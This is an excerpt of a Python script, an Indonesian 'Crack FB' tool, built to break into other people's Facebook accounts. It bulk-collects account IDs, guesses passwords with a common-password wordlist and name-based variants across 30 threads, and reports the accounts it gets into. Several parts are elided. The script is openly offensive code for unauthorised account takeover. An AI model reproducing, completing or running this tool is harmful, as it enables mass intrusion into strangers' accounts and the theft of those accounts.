...
def banner():
	clear()
	wel = '# WELCOME TO CRACK FB'
	wel2 = mark(wel, style='yellow')
	sol().print(wel2)
	au='  Crack FB By ArynzCLem Github:https://github.com/ArynzClem'                                             
...
def menu(my_name,my_id,my_birthday):
	...
	sol().print(fx)
	print(x+'['+h+'•'+x+'] \033[93mYou Name          : '+str(my_name))
	print(x+'['+h+'•'+x+'] \033[93mYou id	         : '+str(my_id))
	print(x+'['+h+'•'+x+'] \033[93mBirth Date        : '+str(birth))
	print(x+'['+h+'•'+x+'] \033[93mYou ip            : '+str(sh['origin']))
	...
	if jh in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] Wait ....')
		time.sleep(1)
		sw = '# THANKS USING MY SC'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = '# PILIH YANG BENER '
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Masukan Jumblah ID ')
	try:
		jum = int(input(x+'['+p+'f'+x+'] Mau Berapa ID: '))
	except ValueError:
		pesan = '# Harus angka  '
...
def setting():
	...
	teks = '\33[37;1m[01] Crack Dari Akun Old\n\33[37;1m[02] Crack Dari Akun New\n\33[37;1m[03] Acak Urutan ID'
...
# WORDLIST
def passwrd():
	ler = '# SEDANG MENGCRACK, TEKAN CTRL+Z UNTUK BERHENTI'
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','kontol']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s •Yoshii• %s/%s ••• OK:%s ••• CP:%s ••• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def ceker(idf,pw):
	...
	try:
		...
		if len(opsi)==0:
			print('\r%s---> 🎉 Hore Akunya Tap Yes (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
